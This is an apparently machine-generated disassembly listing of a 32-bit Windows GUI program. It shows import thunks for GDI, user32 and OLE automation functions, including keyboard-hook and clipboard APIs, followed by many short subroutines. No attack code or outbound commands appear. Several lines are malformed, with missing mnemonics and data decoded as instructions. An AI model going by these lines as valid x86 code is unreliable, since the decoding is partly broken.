jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetEnhMetaFileHeader
jmp [ __import_lookup_table_8(gdi32:GetEnhMetaFileHeader) ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
SetAbortProc
jmp [ SetAbortProc@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ __import_lookup_table_8(gdi32:SetROP2) ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
StartDocA
jmp [ __import_lookup_table_8(gdi32:StartDocA) ]
StartPage
jmp [ __import_lookup_table_8(gdi32:StartPage) ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ BeginDeferWindowPos@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
BringWindowToTop
jmp [ BringWindowToTop@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharNextA
jmp [ CharNextA@IAT ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ChildWindowFromPoint
jmp [ __import_lookup_table_9(user32:ChildWindowFromPoint) ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CloseClipboard
jmp [ __import_lookup_table_9(user32:CloseClipboard) ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ __import_lookup_table_9(user32:DeferWindowPos) ]
DestroyIcon
jmp [ __import_lookup_table_9(user32:DestroyIcon) ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DrawFrameControl
jmp [ __import_lookup_table_9(user32:DrawFrameControl) ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EmptyClipboard
jmp [ __import_lookup_table_9(user32:EmptyClipboard) ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ EndDeferWindowPos@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FillRect
jmp [ FillRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetDlgItem
jmp [ __import_lookup_table_9(user32:GetDlgItem) ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ __import_lookup_table_9(user32:GetScrollRange) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetUpdateRect
jmp [ GetUpdateRect@IAT ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsCharAlphaNumericA
jmp [ IsCharAlphaNumericA@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ __import_lookup_table_9(user32:KillTimer) ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBeep
jmp [ MessageBeep@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
OpenClipboard
jmp [ OpenClipboard@IAT ]
PeekMessageA
jmp [ __import_lookup_table_9(user32:PeekMessageA) ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ __import_lookup_table_9(user32:ReleaseDC) ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetKeyboardState
jmp [ SetKeyboardState@IAT ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ __import_lookup_table_9(user32:TranslateMDISysAccel) ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ __import_lookup_table_9(user32:UpdateWindow) ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ __import_lookup_table_9(user32:WinHelpA) ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_407438
shr eax 0x10
retn
sub_40743c
call GetTickCount
retn
sub_407444
xor eax eax
retn
sub_407448
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_407458
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_407474
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_407488
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_4074c0
call sub_40742c
retn
sub_407619
jmp sub_403e54
sub_407620
pop ebp
retn
sub_407624
sub [ rw-data ] 0x1
retn
sub_407651
jmp sub_403e54
sub_407658
pop ebp
retn
sub_40765c
sub [ rw-data ] 0x1
retn
sub_407931
jmp sub_403e54
sub_407938
pop ebp
retn
sub_40793c
sub [ rw-data ] 0x1
retn
sub_40845d
add eax 0xffffffd4
jmp sub_40da2c
sub_408465
add eax 0xffffffd4
jmp sub_40d7e4
sub_40846d
add eax 0xffffffd4
jmp sub_40d8e4
sub_40847f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_406264
sub_408489
add [ esp + 0x4 ] 0xffffffd4
jmp sub_406278
sub_408560
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
pop ebx
retn
sub_408838
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_408800
test eax eax
sete al
pop esi
pop ebx
retn
sub_408a19
jmp sub_403e54
sub_408a20
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_408c62
jmp sub_403e54
sub_408c69
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_408c70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_408bfc
pop esi
pop ebx
retn
sub_408d04
call sub_408ce0
retn
sub_408d9c
push eax
call CloseHandle
retn
sub_408e0c
push ebx
mov ebx eax
mov eax ebx
call sub_408da4
inc eax
setne al
pop ebx
retn
sub_408fa8
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408fbc
push esi
mov esi eax
xchg edx eax
call sub_4028fc
mov eax esi
pop esi
retn
sub_4091b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_40461c
pop esi
pop ebx
retn
sub_4091c8
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_402744
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_4091dc
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_409214
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_402764
sub_40927c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40532c
pop esi
pop ebx
retn
sub_409290
push ebx
mov ebx eax
mov eax ebx
call sub_40442c
pop ebx
retn
sub_409690
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_40442c
pop eax
pop ebx
retn
sub_409947
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_409aa4
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40a5a2
jmp sub_403e54
sub_40a5a9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a69a
jmp sub_403e54
sub_40a6a1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ae23
jmp sub_403e54
sub_40ae2a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40aff9
jmp sub_403e54
sub_40b000
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40b49a
jmp sub_403e54
sub_40b4a1
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b9bb
jmp sub_403e54
sub_40b9c2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ba6d
jmp sub_403e54
sub_40ba74
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40bb17
jmp sub_403e54
sub_40bb1e
pop esi
pop ecx
pop ebp
retn
sub_40bcfa
jmp sub_403e54
sub_40bd01
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bd58
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40c036
jmp sub_403e54
sub_40c104
jmp sub_403e54
sub_40c12c
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403674
sub_40c228
pop ebx
retn
sub_40c2c8
jmp sub_403e54
sub_40c2cf
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c2d8
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403e8c
sub_40c2e5
retn
sub_40c2e8
push ebp
mov ebp esp
call sub_40c22c
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40c2d8
pop ebp
retn 0x4
sub_40c304
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
retn
sub_40c39c
push ebx
mov ebx eax
mov eax ebx
call sub_40c31c
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40c56f
jmp sub_403e54
sub_40c576
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c63b
jmp sub_403e54
sub_40c642
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c64c
call sub_40beec
mov eax 0x1
call sub_404414
sub_40c840
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c7a4
mov ecx eax
sub_40ca2c
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40ca4c
push eax
call CharNextA
retn
sub_40cd74
jmp sub_403e54
sub_40cd7b
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40cde4
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40d23b
jmp sub_403e54
sub_40d242
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ Sleep@IAT ]
sub_40d380
jmp sub_403e54
sub_40d387
pop ebx
mov esp ebp
pop ebp
retn
sub_40d38c
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40d2f0
sub_40d39c
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40d3b8
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_402764
pop ebx
retn
sub_40d440
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40d454
xchg edx eax
[ edx ] eax
retn
sub_40d500
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d7a0
mov eax [ eax + 0x10 ]
push eax
call ResetEvent
retn
sub_40d7ac
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d7b8
mov eax [ eax + 0x14 ]
push eax
call SetEvent
retn
sub_40d7c4
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x10 ]
push eax
call WaitForSingleObject
retn
sub_40d7d4
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d86c
jmp sub_403e54
sub_40d97a
jmp sub_403e54
sub_40d981
pop ecx
pop ecx
pop ebp
retn
sub_40da1e
jmp sub_403e54
sub_40da25
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40dab1
jmp sub_403e54
sub_40dab8
pop ecx
pop ecx
pop ebp
retn
sub_40db67
jmp sub_403e54
sub_40db6e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40dbdc
jmp sub_403e54
sub_40dbe3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc01
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40dbfa
jmp sub_403e54
sub_40dc01
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40e0c4
jmp sub_403e54
sub_40e0cb
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantClear
jmp [ VariantClear@IAT ]
VariantCopy
jmp [ VariantCopy@IAT ]
VariantCopyInd
jmp [ VariantCopyInd@IAT ]
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayRedim
jmp [ SafeArrayRedim@IAT ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
SafeArrayGetElement
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetElement) ]
SafeArrayPutElement
jmp [ SafeArrayPutElement@IAT ]
sub_40e161
jmp sub_403e54
sub_40e168
pop ebp
retn
sub_40e16c
sub [ rw-data ] 0x1
retn
sub_40e175
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e290
mov al 0x11
jmp sub_4028a0
sub_40e6e3
retn
sub_40e6e4
mov cl 0x1
jmp sub_40e5c4
sub_40e6eb
retn
sub_40e874
jmp sub_403e54
sub_40e87b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40e9ec
jmp sub_403e54
sub_40e9f3
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40ea5a
jmp sub_403e54
sub_40ea61
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eb3e
jmp sub_403e54
j_sub_40ec38
jmp sub_40ec38
sub_40ec5d
retn
sub_40ecf5
jmp sub_403e54
sub_40ed61
jmp sub_403e54
sub_40f35c
jmp sub_403e54
sub_40f3af
jmp sub_403e54
sub_40f3b6
pop ebx
pop ecx
pop ebp
retn
sub_40f41f
jmp sub_403e54
sub_40f48d
jmp sub_403e54
sub_40f494
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f6d8
cmp [ eax ] 0x8
jb r-xdata
mov [ eax ] 0x5
fstp [ eax + 0x8 ]
fwait
retn
push eax
call sub_40e2b0
pop eax
sub_40f6f0
cmp [ eax ] 0x8
jb r-xdata
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
push eax
call sub_40e2b0
pop eax
sub_40f708
cmp [ eax ] 0x8
jb r-xdata
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
push eax
call sub_40e2b0
pop eax
sub_40f78f
jmp sub_403e54
sub_40f796
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40f82c
push eax
call sub_411744
pop eax
cmp [ eax ] 0x0
jne r-xdata
retn
jmp sub_40e298
sub_40f883
jmp sub_403e54
sub_40f88a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40f8d3
jmp sub_403e54
sub_40f8da
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40f935
jmp sub_403e54
sub_40f93c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fb6c
jmp sub_403e54
sub_40fb73
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fde3
jmp sub_403e54
sub_40fdea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fe68
jmp sub_403e54
j_sub_403ccc#2
jmp sub_403ccc
sub_410774
jmp sub_403e54
sub_410a24
jmp sub_403e54
sub_410a2b
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410a38
call sub_410684
cmp al 0x1
retn
sub_410b43
jmp sub_403e54
sub_410b4a
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_40e6e4
jmp sub_40e6e4
sub_410eb1
retn
sub_410eb4
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40e6dc
add esp 0x10
sub_410ed8
mov ax [ eax ]
retn
sub_410fb0
mov [ eax ] 0xa
mov [ eax + 0x8 ] 0x80020004
retn
sub_411029
jmp sub_403e54
sub_411030
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_411038
xor ecx ecx
call sub_410fc0
retn
sub_41122c
xor edx edx
call sub_411234
retn
sub_41137d
jmp sub_403e54
sub_411384
pop ebx
mov esp ebp
pop ebp
retn
sub_4114ea
jmp sub_403e54
sub_411560
xor edx edx
test eax eax
je r-xdata
mov eax edx
retn
xor ecx ecx
mov cl [ eax + 0x1 ]
add eax ecx
mov ecx [ eax + 0x6 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
sub_41157c
push ebx
xor ebx ebx
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
cmp [ eax ] 0x11
je r-xdata
inc ebx
call sub_411560
sub_411a49
jmp sub_403e54
sub_411a50
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411d01
jmp sub_403e54
sub_411d08
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411d23
jmp [ eax - 0x1e ]
sub_411d97
jmp sub_403e54
sub_411d9e
pop esi
pop ebx
pop ebp
retn
sub_411da4
push ebp
mov ebp esp
call sub_411f5c
sub_411e30
push ebp
mov ebp esp
call sub_411f5c
sub_411f0b
jmp sub_403e54
sub_411f12
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4036b0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403a74
sub_411f34
xor eax eax
retn
sub_411f38
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_411f4c
mov [ ecx ] 0x8
mov al 0x1
retn
sub_411f54
call sub_40e298
sub_411f5c
call sub_40e2a0
sub_411f64
call sub_40e290
sub_411f6c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_411f80
call sub_411f5c
sub_411f88
push ebp
mov ebp esp
call sub_411f64
sub_411fa0
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_412065
jmp sub_403e54
sub_41206c
mov al [ ebp - 0x1 ]
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41212d
jmp sub_403e54
sub_412134
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412151
lea eax [ ebp - 0x10 ]
call sub_40442c
retn
sub_41214a
jmp sub_403e54
sub_412151
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41215c
push ebx
mov ebx eax
mov eax ebx
call sub_40e2b0
mov [ ebx ] 0x1
pop ebx
retn
sub_4121ca
jmp sub_403e54
sub_4121d1
pop ebp
retn
sub_4123ce
jmp sub_403e54
sub_4123d5
pop ebx
pop ebp
retn
sub_4124ed
jmp sub_403e54
sub_4124f4
pop ebp
retn
sub_4124f8
sub [ rw-data ] 0x1
retn
sub_412613
jmp sub_403e54
sub_41261a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_412938
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_4128a0
mov eax ebx
mov edx esp
call sub_404688
add esp 0x100
pop ebx
retn
sub_412994
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_404480
pop esi
pop ebx
retn
sub_412a70
jmp sub_403e54
sub_412a77
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_412ac8
jmp sub_403e54
sub_412acf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_412c1c
jmp sub_403e54
sub_412c23
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412cf2
jmp sub_403e54
sub_412cf9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413010
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_4052fc
pop esi
pop ebx
retn
sub_4132ba
jmp sub_403e54
sub_4132c1
pop ebp
retn
sub_4132c4
sub [ rw-data ] 0x1
retn
sub_4132f1
jmp sub_403e54
sub_4132f8
pop ebp
retn
sub_4132fc
sub [ rw-data ] 0x1
retn
sub_413add
jmp [ esp + ebp * 2 ]
sub_4143b9
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_41490f
push ecx
push eax
[ eax - 0x4fffbe1b ]
sub_414a2a
inc ecx
add al al
0x54100041 0x6142
sub_414ac4
aam 0xeb
inc ecx
add [ eax - 0x15 ] ch
inc ecx
add [ eax + 0x6c0041eb ] bl
jmp sub_414b14
sub_414b54
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_414bc8
push ecx
mov [ esp ] eax
cmp [ esp ] 0xffff
jne r-xdata
xor eax eax
pop edx
retn
cmp [ esp + 0x2 ] 0xffff
je r-xdata
mov al 0x1
pop edx
retn
sub_414c94
mov eax [ eax + 0xc ]
call sub_416044
retn
sub_414f6b
jmp sub_403e54
sub_414f72
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414f78
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4161fc
test eax eax
setge al
pop esi
pop ebx
retn
sub_41527b
jmp sub_403e54
sub_415282
mov esp ebp
pop ebp
retn
sub_415350
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41535c
push ebx
mov ebx edx
mov edx ebx
call sub_415170
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_414ed0
sub_415408
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_415543
jmp sub_403e54
sub_415617
jmp sub_403e54
sub_415628
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_415694
jmp sub_403e54
sub_41569b
pop ebx
mov esp ebp
pop ebp
retn
sub_4156e6
jmp sub_403e54
sub_4156ed
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_415779
jmp sub_403e54
sub_415780
pop ebx
pop ebp
retn
sub_4157c6
jmp sub_403e54
sub_4157cd
pop ebx
pop ebp
retn
sub_415812
jmp sub_403e54
sub_415819
pop ebx
pop ebp
retn
sub_415863
jmp sub_403e54
sub_41586a
pop esi
pop ebx
pop ebp
retn
sub_4158be
jmp sub_403e54
sub_4158c5
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4159f2
jmp sub_403e54
sub_415a6e
jmp sub_403e54
sub_415b44
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_416340
sub_415c34
jmp sub_403e54
sub_415dbe
jmp sub_403e54
sub_415dc5
mov eax ebx
pop esi
pop ebx
mov esp ebp
